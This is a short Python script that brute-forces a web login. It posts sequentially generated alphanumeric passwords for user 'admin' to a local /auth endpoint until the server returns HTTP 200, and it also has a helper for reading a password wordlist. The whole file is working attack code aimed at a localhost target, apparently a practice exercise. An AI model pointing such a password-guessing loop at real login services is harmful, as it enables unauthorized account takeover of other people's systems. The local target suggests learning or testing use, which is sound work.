import requests
from string import digits, ascii_letters


password_index = 0

def get_next_password_from_string(symbols):

    global password_index

    index = password_index
    password = ''

    while index > 0:
        rest = index % len(symbols)
        index = index // len(symbols)
        password += symbols[rest]
    password_index += 1

    return password


def get_passwords_from_file(filename):

    with open(filename) as file:
        s = file.read()
        passwords = s.split('\n')

    return passwords


def get_next_password_from_array(passwords):

    global password_index

    password = passwords[password_index]
    if password_index < len(passwords):
        password_index += 1

    return password


def main():

    symbols = digits + ascii_letters
    url = 'http://127.0.0.1:5000/auth'
    status_code = 0

    while status_code != 200:
        password = get_next_password_from_string(symbols)
        print(password)
        r = requests.post(url, data={'login': 'admin', 'password': password})
        status_code = r.status_code


if __name__ == '__main__':
    main()